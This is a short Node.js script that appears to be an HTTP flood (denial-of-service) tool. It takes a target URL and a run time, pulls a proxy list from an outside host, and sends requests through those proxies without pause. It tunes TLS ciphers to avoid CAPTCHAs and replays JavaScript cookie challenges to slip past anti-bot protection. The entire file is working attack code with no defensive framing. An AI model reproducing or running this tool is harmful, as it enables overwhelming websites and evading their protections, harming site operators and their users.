var request = require('request');
const cloudscraper = require('cloudscraper');
const fs = require('fs');
const {
    constants
} = require('crypto');
var p = process.argv[2];

require('events').EventEmitter.prototype._maxListeners = 100;

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

var theproxy = 0;

var cookies = {};

setTimeout(() => {
    process.exit(1);
}, process.argv[3] * 1000);

var target = p.replace('https', 'http');

request.get('https://mezy.wtf/filtered.txt', (err, res, body) => {
    var proxies = body.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
    console.log(proxies.length + " Proxies loaded.");
    setInterval(function() {
        theproxy = theproxy + 1;
        if (theproxy == proxies.length - 1) {
            theproxy = 0;
        }
        var ourproxy = proxies[theproxy];
        cloudscraper.get({
            agentOptions: {
                // Disable TLSv1.0/TLSv1.1
                secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                // Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
            },
            url: target,
            headers: {
                cookie: cookies[ourproxy] || ''
            },
            resolveWithFullResponse: true,
            simple: false,
            followRedirect: false,
        }, function(error, response, body) {
            if (body) {
                if (body.indexOf('document.cookie="') !== -1) {
                    var asd = body.split('"');
                    cookies[ourproxy] = response.request.headers['cookie'] + '; ' + asd[1] + ';';

                    cloudscraper.get({
                        agentOptions: {
                            // Disable TLSv1.0/TLSv1.1
                            secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                            // Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                            ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                        },
                        uri: asd[3],
                        headers: {
                            cookie: cookies[ourproxy]
                        },
                        resolveWithFullResponse: true,
                        simple: false,
                        followRedirect: false,
                    }, function(error, response, body) {
                    });
                }
            }
        });
    });
});
